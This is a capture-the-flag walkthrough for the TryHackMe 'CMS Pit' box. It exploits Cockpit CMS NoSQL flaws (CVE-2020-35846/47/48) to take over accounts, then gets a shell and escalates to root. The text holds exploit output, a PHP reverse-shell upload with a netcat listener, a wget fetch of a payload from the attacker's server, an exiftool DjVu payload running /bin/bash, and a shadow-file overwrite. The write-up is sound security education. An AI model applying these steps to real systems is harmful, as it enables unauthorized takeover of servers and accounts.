# CMS PIT Walkthrough - w/o Metasploit

I was interested in documenting this box, since I used it to write my own exploit, hence the writeup. You can access the box at
> https://tryhackme.com/room/cmspit

## Scanning

We start off by running an extensive `nmap` scan. I prefer using [nmapAutomator](https://github.com/21y4d/nmapAutomator) for this.


```bash
# cat nmapAutomator_10.10.48.163_Full.txt

```

Only port 22 and 80 are running, so naturally, we proceed to enumerate port 80.

## Enumeration

Heading over to port 80, we find the landing page below. After basic checking of the icon, we establish this is cockpit CMS.

![](/assets/img/images/cockpit/cms.png)
_cockpit cms_

We can check the CMS's [Github Page](https://github.com/agentejo/cockpit), to enumerate files and determine the version. For instance, using the `package.json` file, we can determine the running version.

![](/assets/img/images/cockpit/version.png)

A quick google search for the CMS version, tells us the version is vulnerable to a three NoSQL vulnerabilities documented under CVE-2020-35846, CVE-2020-35847 and CVE-2020-35848. Read more about it [here](https://swarm.ptsecurity.com/rce-cockpit-cms/).

## Exploitation

Basically, the CMS does not carry out proper checks on the following methods, which allows for username extraction, and password reset, leading to full account takeover.

> /auth/check -- CVE-2020-35846

> /auth/resetpassword -- CVE-2020-35847

> /auth/newpassword -- CVE-2020-35848

Again, Swam Security have done a good job documenting it [here](https://swarm.ptsecurity.com/rce-cockpit-cms/).

At the time of writing this, I was able to get RCE on the platform using Metasploit. I however wanted to challenge myself to pwn it by writing my own python implementation exploit, and as a way to practice what I learnt from OSCP.:

I wrote this [`exploit`](https://github.com/w33vils/CVE-2020-35847_CVE-2020-35848) that allows for username enumeration, password reset token request and password reset, which leads to a full account takeover.

> https://github.com/w33vils/CVE-2020-35847_CVE-2020-35848

We can use the exploit to get details for user `skidy` as below:

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/â€¦/c/thm/cmspit/CVE-2020-35847_CVE-2020-35848]
â””â”€# python3 exploit.py -u http://10.10.120.242
[+] http://10.10.120.242: is reachable
[-] Attempting Username Enumeration : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

[-] Get user details For : skidy
[+] Finding Password reset tokens
         Tokens Found : ['rp-285c93eea18105373be28d8e2d5f22c861102d2b04b29']
[+] Obtaining user information 
-----------------Details--------------------
         [*] user : skidy
         [*] email : <redacted
         [*] active : True
         [*] group : admin
         [*] i18n : en
         [*] api_key : account-21ca3cfc400e3e565cfcb0e3f6b96d
         [*] password : $2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S
         [*] name : Skidy
         [*] _modified : 1621719311
         [*] _created : 1621719311
         [*] _id : 60a9790f393037a2e400006a
         [*] _reset_token : rp-285c93eea18105373be28d8e2d5f22c861102d2b04b29
         [*] md5email : 5dfac21f8549f298b8ee60e4b90c0e66
--------------------------------------------
```

Futhermore, we can reset skidy's password. But lets reset the admin's password instead. For this, we need to generate the admin's password reset token (if not already available) rerunning the code and selecting admin user will automatically generate the admin's tokens.

You can then reset the password as below:

![](/assets/img/images/cockpit/admin.png)
_Taking over the admin's account_

After this, we can log into the platform with the new credentials.

After successfully logging in as admin, we can use the `finder` utility in Cockpit, to upload a PHP reverse shell. We can use [pentest monkey's](https://github.com/pentestmonkey/php-reverse-shell) php reverse shell. Make sure to edit the IP and port that you will be listening on.

![](/assets/img/images/cockpit/finder.png)
_finder utility for uploading reverse shell_

Next, start a netcat listener on the port you configured, 443 in my case.

```bash
â””â”€# nc -nlvp 443
listening on [any] 443 ..
```
Then, we can navigate to the reverse shell, to trigger it to get a reverse shell.

```plaintext
http://10.10.120.242/shell.php
```
We get a shell running as:

![](/assets/img/images/cockpit/shell.png)
_www-data shell_

The first flag can be found under */var/www/html/cockpit/webflag.php'*

![](/assets/img/images/cockpit/flag1.png)
_First flag_

## Privilege Escalation

Accessing user `stux`'s homepage, we get an interesting `dbshell` file. Checking it's contents, we get the second flag, as well as what looks like a password.

![](/assets/img/images/cockpit/flag2.png)
_Second flag & Password_

We try to SSH to the box as user stux, and the password, and we are successful. Subsequently, we are able to read the `user.txt` flag.

![](/assets/img/images/cockpit/user.png)
_user.txt_

Further enumeration of `sudo rights`, we notice user stux can run *exiftool* as sudo without a password.


![](/assets/img/images/cockpit/exiftool.png)

From searching exiftool CVE's on Google, we bump into this [article](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)

The blog has answers to the remaining questions:

According to the blog, we can create a file, *payload*, with the contents :

```bash
â””â”€# cat payload 
(metadata "\c${system('/bin/bash')};")
```

Then follow the steps below:
```bash
- sudo apt install djvulibre-bin
- bzz payload payload.bzz
- djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

```

If you follow the above steps correctly, you should end up with two files as below:

![](/assets/img/images/cockpit/djvu.png)
_generated files_

We upload the `exploit.djvu` file to our victim machine. We can use a python simple server serving on port 80 for this.

```bash
â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
On our victim machine, we can use `wget` to download.

```bash
wget http://10.9.167.154/exploit.djvu
```

Finally, we run the exploit using exiftool as sudo as below to get root.

![](/assets/img/images/cockpit/priv.png)
_Running the exploit using exiftool gives us root._

### Alternative method.

You can also use [GTFOBINS](https://gtfobins.github.io/gtfobins/exiftool/) to gain root on this box.

You can follow the steps:

- First, create a backup of the */etc/shadow* file using exiftool.
- Then copy your kali's /etc/shadow to your working directory, generate a sha512 password using *mkpasswd* and replace the new hash with the root's hash.
- Upload this file on the host, and copy it onto the */etc/shadow* path.
- Finally, sudo with the new password.

## Lessons learnt

1. Constantly patching software to avoid using components with known vulnerabilities.
2. Not running exiftool as sudo, without a password.
